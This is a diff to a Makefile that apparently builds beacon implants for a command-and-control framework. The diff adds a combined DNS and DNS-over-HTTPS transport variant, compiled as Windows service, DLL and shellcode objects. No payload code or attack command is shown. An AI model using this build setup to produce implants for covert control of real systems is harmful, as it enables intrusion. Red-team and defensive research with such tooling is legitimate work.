@@ -7,6 +7,7 @@ SMB_DIST_DIR := "objects_smb"
 TCP_DIST_DIR := "objects_tcp"
 DNS_DIST_DIR := "objects_dns"
 DOH_DIST_DIR := "objects_doh"
+DNS_DOH_DIST_DIR := "objects_dns_doh"
 
 HTTP_OBJECTS_X64 := $(patsubst beacon/%.cpp, $(HTTP_DIST_DIR)/%.x64.o, $(SOURCES))
 HTTP_OBJECTS_X86 := $(patsubst beacon/%.cpp, $(HTTP_DIST_DIR)/%.x86.o, $(SOURCES))
@@ -22,6 +23,9 @@ DNS_OBJECTS_X86 := $(patsubst beacon/%.cpp, $(DNS_DIST_DIR)/%.x86.o, $(SOURCES))
 
 DOH_OBJECTS_X64 := $(patsubst beacon/%.cpp, $(DOH_DIST_DIR)/%.x64.o, $(SOURCES))
 DOH_OBJECTS_X86 := $(patsubst beacon/%.cpp, $(DOH_DIST_DIR)/%.x86.o, $(SOURCES))
+
+DNS_DOH_OBJECTS_X64 := $(patsubst beacon/%.cpp, $(DNS_DOH_DIST_DIR)/%.x64.o, $(SOURCES))
+DNS_DOH_OBJECTS_X86 := $(patsubst beacon/%.cpp, $(DNS_DOH_DIST_DIR)/%.x86.o, $(SOURCES))
 
 SECURITY_FLAGS := -fno-stack-protector \
                  -fno-strict-overflow \
@@ -74,10 +78,10 @@ all: clean pre x64 x86
 	@ cp $(FILES_DIR)/stub.x86.bin $(DOH_DIST_DIR)/stub.x86.bin
 
 clean:
-	@rm -rf $(HTTP_DIST_DIR) $(SMB_DIST_DIR) $(TCP_DIST_DIR) $(DNS_DIST_DIR) $(DOH_DIST_DIR)
-	@mkdir -p $(HTTP_DIST_DIR) $(SMB_DIST_DIR) $(TCP_DIST_DIR) $(DNS_DIST_DIR) $(DOH_DIST_DIR)
+	@rm -rf $(HTTP_DIST_DIR) $(SMB_DIST_DIR) $(TCP_DIST_DIR) $(DNS_DIST_DIR) $(DOH_DIST_DIR) $(DNS_DOH_DIST_DIR)
+	@mkdir -p $(HTTP_DIST_DIR) $(SMB_DIST_DIR) $(TCP_DIST_DIR) $(DNS_DIST_DIR) $(DOH_DIST_DIR) $(DNS_DOH_DIST_DIR)
 
-x64: $(HTTP_OBJECTS_X64) $(SMB_OBJECTS_X64) $(TCP_OBJECTS_X64) $(DNS_OBJECTS_X64) $(DOH_OBJECTS_X64)
+x64: $(HTTP_OBJECTS_X64) $(SMB_OBJECTS_X64) $(TCP_OBJECTS_X64) $(DNS_OBJECTS_X64) $(DOH_OBJECTS_X64) $(DNS_DOH_OBJECTS_X64)
 	@ # http
 	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_HTTP -D BUILD_SVC -o $(HTTP_DIST_DIR)/main_service.x64.o
 	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_HTTP -D BUILD_DLL -o $(HTTP_DIST_DIR)/main_dll.x64.o
@@ -103,8 +107,13 @@ x64: $(HTTP_OBJECTS_X64) $(SMB_OBJECTS_X64) $(TCP_OBJECTS_X64) $(DNS_OBJECTS_X64
 	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_DOH -D BUILD_DLL -o $(DOH_DIST_DIR)/main_dll.x64.o
 	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_DOH -D BUILD_SHELLCODE -o $(DOH_DIST_DIR)/main_shellcode.x64.o
 	@rm -f $(DOH_DIST_DIR)/ConnectorHTTP.x64.o $(DOH_DIST_DIR)/ConnectorSMB.x64.o $(DOH_DIST_DIR)/ConnectorTCP.x64.o $(DOH_DIST_DIR)/ConnectorDNS.x64.o
+	@ # dns_doh
+	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_DNS_DOH -D BUILD_SVC -o $(DNS_DOH_DIST_DIR)/main_service.x64.o
+	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_DNS_DOH -D BUILD_DLL -o $(DNS_DOH_DIST_DIR)/main_dll.x64.o
+	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_DNS_DOH -D BUILD_SHELLCODE -o $(DNS_DOH_DIST_DIR)/main_shellcode.x64.o
+	@rm -f $(DNS_DOH_DIST_DIR)/ConnectorHTTP.x64.o $(DNS_DOH_DIST_DIR)/ConnectorSMB.x64.o $(DNS_DOH_DIST_DIR)/ConnectorTCP.x64.o
 
-x86: $(HTTP_OBJECTS_X86) $(SMB_OBJECTS_X86) $(TCP_OBJECTS_X86) $(DNS_OBJECTS_X86)
+x86: $(HTTP_OBJECTS_X86) $(SMB_OBJECTS_X86) $(TCP_OBJECTS_X86) $(DNS_OBJECTS_X86) $(DOH_OBJECTS_X86) $(DNS_DOH_OBJECTS_X86)
 	@ # http
 	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_HTTP -D BUILD_SVC -o $(HTTP_DIST_DIR)/main_service.x86.o
 	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_HTTP -D BUILD_DLL -o $(HTTP_DIST_DIR)/main_dll.x86.o
@@ -130,6 +139,11 @@ x86: $(HTTP_OBJECTS_X86) $(SMB_OBJECTS_X86) $(TCP_OBJECTS_X86) $(DNS_OBJECTS_X86
 	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_DOH -D BUILD_DLL -o $(DOH_DIST_DIR)/main_dll.x86.o
 	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_DOH -D BUILD_SHELLCODE -o $(DOH_DIST_DIR)/main_shellcode.x86.o
 	@rm -f $(DOH_DIST_DIR)/ConnectorHTTP.x86.o $(DOH_DIST_DIR)/ConnectorSMB.x86.o $(DOH_DIST_DIR)/ConnectorTCP.x86.o $(DOH_DIST_DIR)/ConnectorDNS.x86.o
+	@ # dns_doh
+	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_DNS_DOH -D BUILD_SVC -o $(DNS_DOH_DIST_DIR)/main_service.x86.o
+	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_DNS_DOH -D BUILD_DLL -o $(DNS_DOH_DIST_DIR)/main_dll.x86.o
+	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_DNS_DOH -D BUILD_SHELLCODE -o $(DNS_DOH_DIST_DIR)/main_shellcode.x86.o
+	@rm -f $(DNS_DOH_DIST_DIR)/ConnectorHTTP.x86.o $(DNS_DOH_DIST_DIR)/ConnectorSMB.x86.o $(DNS_DOH_DIST_DIR)/ConnectorTCP.x86.o
 
 
 
@@ -168,3 +182,9 @@ $(DOH_DIST_DIR)/%.x64.o: beacon/%.cpp
 
 $(DOH_DIST_DIR)/%.x86.o: beacon/%.cpp
 	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) -D BEACON_DOH -c $< -o $@
+
+$(DNS_DOH_DIST_DIR)/%.x64.o: beacon/%.cpp
+	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) -D BEACON_DNS_DOH -c $< -o $@
+
+$(DNS_DOH_DIST_DIR)/%.x86.o: beacon/%.cpp
+	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) -D BEACON_DNS_DOH -c $< -o $@
